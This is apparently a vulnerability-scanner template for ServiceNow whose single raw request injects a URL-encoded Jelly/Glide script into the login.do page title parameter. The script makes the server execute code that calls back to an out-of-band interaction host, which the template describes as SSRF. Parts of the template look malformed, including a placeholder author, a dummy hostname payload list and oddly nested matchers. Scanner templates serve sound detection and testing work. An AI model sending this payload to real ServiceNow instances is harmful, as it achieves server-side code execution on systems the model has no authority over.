id: servicenow-pingback

info:
  name: ServiceNow SSRF to OAST
  author: your-name
  severity: high
  description: This template checks for SSRF vulnerability in ServiceNow login.do page using Glide scripts.

requests:
  - raw:
      - |
        GET /login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly:core%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Evar%20HttpClient%20=%20Packages.org.apache.commons.httpclient.HttpClient%3Bvar%20GetMethod%20=%20Packages.org.apache.commons.httpclient.methods.GetMethod%3Bvar%20client%20=%20new%20HttpClient()%3Bvar%20method%20=%20new%20GetMethod('http://{{interactsh-url}}')%3Bclient.executeMethod(method)%3B%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    attack: pitchfork

    payloads:
      Hostname:
        - "hostname"

    matchers:
      - type: interactsh_protocol
        part: interactsh
        matchers-condition: and
        name: "Servicenow SSRF Interactsh"
